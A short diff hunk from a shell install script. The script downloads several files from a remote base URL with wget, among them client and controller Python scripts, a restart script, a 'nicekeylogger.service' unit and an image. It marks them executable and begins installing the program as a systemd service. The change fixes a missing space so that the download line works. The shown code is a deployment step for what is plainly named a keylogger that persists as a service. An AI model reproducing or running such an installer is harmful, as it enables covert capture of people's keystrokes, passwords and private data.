@@ -22,7 +22,7 @@ CLIENT=${base}client.py
 RSTRT=${base}restart.sh
 KLSERV=${base}nicekeylogger.service
 PUP=${base}puppy.jpg
-wget -L "$CONT" "$KMAP" "$FKEY" "$CLIENT" "$KLSERV" "$RSTRT""$PUP"
+wget -L "$CONT" "$KMAP" "$FKEY" "$CLIENT" "$KLSERV" "$RSTRT" "$PUP"
 sudo chmod +x controller.py restart.sh client.py
 
 # SET APPLICATION AS A SERVICE WITH SYSTEMD
